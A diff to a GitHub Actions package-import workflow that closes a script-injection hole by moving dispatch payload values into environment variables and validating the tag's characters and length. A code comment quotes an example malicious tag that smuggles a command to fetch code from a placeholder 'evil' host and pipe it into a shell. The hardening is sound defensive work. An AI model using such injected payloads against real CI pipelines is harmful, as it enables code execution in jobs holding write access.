@@ -23,12 +23,25 @@ jobs:
         uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
 
       - name: Reject unexpected source repo
+        env:
+          DISPATCH_REPO: ${{ github.event.client_payload.repo }}
+          DISPATCH_TAG: ${{ github.event.client_payload.tag }}
         run: |
-          _repo="${{ github.event.client_payload.repo }}"
+          # client_payload arrives via env, never ${{ }} interpolation into
+          # shell: a crafted tag like `"; curl evil|sh; #"` would otherwise
+          # execute in this contents:write job.
           case ",${ALLOWED_REPOS}," in
-            *",${_repo},"*) echo "source repo: ${_repo} (allowed)" ;;
-            *) echo "ERROR: dispatch from untrusted repo '${_repo}' (allowed: ${ALLOWED_REPOS})" >&2; exit 1 ;;
+            *",${DISPATCH_REPO},"*) echo "source repo: ${DISPATCH_REPO} (allowed)" ;;
+            *) echo "ERROR: dispatch from untrusted repo '${DISPATCH_REPO}' (allowed: ${ALLOWED_REPOS})" >&2; exit 1 ;;
           esac
+          # Tag shape: release tags are v<semver>; bound length + charset so a
+          # hostile dispatch payload cannot smuggle metacharacters downstream.
+          case "${DISPATCH_TAG}" in
+            ""|*[!A-Za-z0-9._-]*) echo "ERROR: invalid tag '${DISPATCH_TAG}'" >&2; exit 1 ;;
+          esac
+          if [ "${#DISPATCH_TAG}" -gt 64 ]; then
+            echo "ERROR: tag too long (${#DISPATCH_TAG} > 64)" >&2; exit 1
+          fi
 
       - name: Install Rust
         run: |
@@ -43,6 +56,8 @@ jobs:
       - name: Download release assets (no clobber)
         env:
           GH_TOKEN: ${{ github.token }}
+          DISPATCH_REPO: ${{ github.event.client_payload.repo }}
+          DISPATCH_TAG: ${{ github.event.client_payload.tag }}
         run: |
           set -e
           # Refuse to clobber an existing pool file. Either the dispatch is a
@@ -58,13 +73,13 @@ jobs:
           _check_no_overlap apt/pool/main
           _check_no_overlap rpm/pool
 
-          gh release download "${{ github.event.client_payload.tag }}" \
-            --repo "${{ github.event.client_payload.repo }}" \
+          gh release download "${DISPATCH_TAG}" \
+            --repo "${DISPATCH_REPO}" \
             --pattern "*.deb" \
             --dir apt/pool/main/ || true
 
-          gh release download "${{ github.event.client_payload.tag }}" \
-            --repo "${{ github.event.client_payload.repo }}" \
+          gh release download "${DISPATCH_TAG}" \
+            --repo "${DISPATCH_REPO}" \
             --pattern "*.rpm" \
             --dir rpm/pool/ || true
 
@@ -132,11 +147,14 @@ jobs:
           done
 
       - name: Commit and push changes
+        env:
+          DISPATCH_REPO: ${{ github.event.client_payload.repo }}
+          DISPATCH_TAG: ${{ github.event.client_payload.tag }}
         run: |
           git config --global user.name "github-actions[bot]"
           git config --global user.email "41898282+github-actions[bot]@users.noreply.github.com"
           git add -A
           # Commit only if files have changed (e.g. packages added or indices updated)
-          git diff-index --quiet HEAD || git commit -m "Import ${{ github.event.client_payload.repo }} ${{ github.event.client_payload.tag }}"
+          git diff-index --quiet HEAD || git commit -m "Import ${DISPATCH_REPO} ${DISPATCH_TAG}"
           git pull --rebase
           git push
